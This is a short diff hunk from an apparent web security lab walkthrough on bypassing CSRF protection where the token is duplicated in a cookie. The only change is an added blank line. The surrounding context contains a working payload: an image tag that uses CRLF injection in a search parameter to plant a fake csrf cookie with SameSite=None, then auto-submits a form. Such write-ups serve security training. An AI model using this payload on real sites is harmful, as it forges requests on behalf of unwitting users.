@@ -211,6 +211,7 @@ This lab is somehow similar to the one before. In this case the ``csrf`` is dupl
 ```html
 <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
 ```
+
 7. Store the exploit, then click "Deliver to victim" to solve the lab.
 
 example:
